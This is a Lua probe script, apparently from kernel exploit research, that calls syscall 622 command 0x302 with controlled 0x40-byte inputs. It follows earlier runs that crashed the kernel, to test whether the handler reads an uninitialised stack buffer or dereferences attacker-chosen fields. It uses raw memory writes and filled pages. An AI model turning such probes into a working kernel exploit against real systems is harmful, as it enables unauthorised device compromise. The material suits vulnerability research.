-- CRASH_CLASS: HIGH
-- PROBE 1053a: sys 622 cmd 0x302 with a *defined* 0x40-byte input
--
-- 1039a: 0x302 kills with len=0.  1040a: it also kills when slot 3 points at a valid
-- zeroed user page with len=0.  So the pointer is not the problem - the arm is reached
-- either way.
--
-- The assembly shows why.  Every case of the 0x302..0x320 table falls into
--   mov rdi,r13          ; user source (slot 3)
--   mov rdx,r12          ; length (slot 4, gated <= 0x40)
--   lea rsi,[rbp-0x70]   ; 0x40-byte stack buffer
--   call 0x7ddbb0        ; copyin
--   ... call 0x7df180(ctx, cmd, buf, &status)
--   (results/kernel_handlers/asm/sys_622_deep.asm:160-176, decompile :92)
-- With len=0 nothing is copied, so the per-command handler reads whatever the stack
-- held.  Passing a full 0x40 bytes is the first run where the handler sees data we
-- chose.  A survives -> the death was the uninitialised stack, and the arm is reachable.
print("=== PROBE 1053a: 622 0x302 with a defined input ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function as_addr(x) local m = tostring(x):match("0x(%x+)"); if m then return tonumber(m, 16) end return to_num(x) end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function wd(a, v) pcall(function() memory.write_dword(a, uint64(v)) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, uint64(v)) end) end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end return -1 end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end return -1 end
local function hex(v) return string.format("%X", v) end

local sc622, sc_pid = mk(622), mk(20)
print(string.format("[S] pid=%d", to_num(select(2, pcall(function() return sc_pid(uint64(0)) end)))))

local zpage = memory.alloc(0x1000); local zp = as_addr(zpage)
local apage = memory.alloc(0x1000); local ap = as_addr(apage)
local buf = memory.alloc(0x200); local ba = as_addr(buf)
print(string.format("[A] zero=%X fill=%X buf=%X", zp, ap, ba))
if zp == 0 or ap == 0 or ba == 0 then print("[!] address conversion failed"); return end
for o = 0, 0xFFC, 4 do wd(zp + o, 0) end
for o = 0, 0xFFC, 4 do wd(ap + o, 0x41414141) end
if rd(ap) ~= 0x41414141 then print("[!] fill page did not arm"); return end

local function run(tag, cmd, src, len)
    for o = 0, 0x1FC, 8 do wq(ba + o, 0xFFFFFFFFFFFFFFFF) end
    print(string.format(">%s cmd=%s src=%s len=%s", tag, hex(cmd), hex(src), len))
    local ok, v = pcall(function()
        return sc622(uint64(cmd), uint64(0), uint64(ba), uint64(src), uint64(len), uint64(0))
    end)
    print(string.format("[%s] rv=%s reply=%s", tag, ok and hex(to_num(v)) or "FAIL", hex(rq(ba))))
end

-- control: a command that is known to return, same slot shape
run("A_ctl300", 0x300, zp, 0x40)
-- the arm under test, fully defined zero input
run("B_302_zero", 0x302, zp, 0x40)
-- same length, recognisable bytes: if B survives and C dies, the handler dereferences
-- fields taken from the copied data
run("C_302_fill", 0x302, ap, 0x40)
-- half length, in case the arm reads a field past the copied region
run("D_302_half", 0x302, zp, 0x20)
print("[Z] done pid=" .. tostring(to_num(select(2, pcall(function() return sc_pid(uint64(0)) end)))))
